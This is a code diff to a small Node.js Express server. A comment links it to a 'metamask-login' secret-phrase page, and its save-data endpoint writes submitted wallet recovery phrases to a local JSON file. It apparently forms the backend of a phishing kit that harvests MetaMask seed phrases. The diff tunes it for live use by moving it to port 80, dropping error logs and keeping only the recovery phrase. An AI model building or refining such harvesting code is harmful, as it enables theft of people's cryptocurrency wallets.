@@ -2,9 +2,9 @@ const express = require("express");
 const fs = require("fs");
 const path = require("path");
 const app = express();
-const PORT = 3000;
+const PORT = 80;
 
-// http://localhost:3000/metamask-login?type=secreat-phrase
+// http://localhost:80/metamask-login?type=secreat-phrase
 
 // Middleware to parse JSON bodies
 app.use(express.json());
@@ -17,13 +17,12 @@ app.post("/save-data", (req, res) => {
   const filePath = path.join(__dirname, "data.json");
   fs.readFile(filePath, "utf8", (err, data) => {
     if (err) {
-      console.error("Error reading file:", err);
       return res.status(500).send("Error reading file");
     }
 
     const jsonData = JSON.parse(data);
     if (!jsonData.find((item) => item.recover === newData.recover)) {
-      jsonData.push(newData); // Add the new data to the array
+      jsonData.push({recover: newData.recover}); // Add the new data to the array
     }
     // Write the updated data back to data.json
     fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
